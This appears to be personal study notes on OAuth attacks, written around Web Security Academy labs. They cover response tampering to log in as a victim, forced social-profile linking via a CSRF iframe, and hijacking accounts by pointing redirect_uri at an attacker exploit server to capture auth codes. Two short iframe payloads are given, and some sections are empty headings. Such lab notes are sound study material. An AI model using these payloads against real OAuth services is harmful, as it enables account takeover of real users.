# OAuth

https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2
### Authentication bypass via OAuth implicit flow

Observer the entire flow of the auth process. 

After doing all starting step there is an end point `/me` request sent by the client application to server to validate or to get basic information about the user. 

Intercept this request on the go and modify the response of email parameter to other or victim user. (try to change the username parameter also but in this case it is optional).

After **response modification** we logged in as victim user.

### Forced OAuth profile linking

1st and foremost thing is, in the process of authentication there is no STATE parameter (which is protection for CSRF) so it might vuln to CSRF

After clicking of attaching social profile after logging in, It is creating an ID (client_id) 

This client ID is unique for a session (works only one time)

This client ID is passing to followed by interaction --> auth --> oauth-linking

To attack this vuln, we need to replicate these steps to get our own valid client_id that was created with our social credentials and we need to stop (drop) before oauth-linking request i.e. is at the auth request.

Now copy the URL (with client_id) craft an xss payload to trigger this URL. Then the application will follow the next steps that is oauth-linking.

We will send this payload via CSRF. (JS included in code)

`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>`

That results, whoever visits the URL, our social login creds will linked to the victim account. So we can login with our social creds with victim creds.

### SSRF via OpenID dynamic client registration

### OAuth account hijacking via redirect_uri

After initiating the and requests followed by there is a request that contains (`/auth?client_id`) client_id and redirect_uri. 

The redirect_uri is vulnerable. If we send it to repeater and replace with attacker website we are not getting any errors.

And after the `/auth?client_id` the client_id is passing to the redirect_uri. so if we replace the redirect_uri with our attacker website we can see the client_id in our logs.

So we will send our client id along with our attacker url as redirect_uri as CSRF. that will results sending the auth code to our attacker logs.

No we will use this auth code in our browser to `/oauth-callback` with the stealed or received auth ID. 

Now this will complete the remaining steps of linked our account to the victim account. And now we will be logged in as victim.

CSRF Payload:
`<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>`

### Stealing OAuth access tokens via an open redirect

### Stealing OAuth access tokens via a proxy page
